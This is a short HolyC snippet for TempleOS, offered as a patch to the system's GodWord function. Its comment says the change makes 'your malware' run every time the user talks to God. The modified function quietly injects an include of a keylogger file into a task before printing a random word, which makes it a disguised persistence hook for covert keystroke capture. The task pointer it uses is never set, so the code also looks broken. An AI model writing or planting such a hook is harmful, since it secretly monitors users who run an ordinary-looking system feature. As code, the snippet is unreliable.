// Replace GodWord in /Adam/God/HolySpirit.HC with the code below to run your malware everytime the user talks to god

public U0 GodWord(I64 bits=17)
{//Make God pick a word. $LK+PU,"Holy Spirit Instructions",A="FI:::/Adam/God/HSNotes.DD"$

  // run file
  CTask *task;
  XTalk(task,"#include \"/Home/Keylogger.HC\";\n");

  if (god.num_words)
    "%s ",god.words[GodBits(bits)%god.num_words];
}
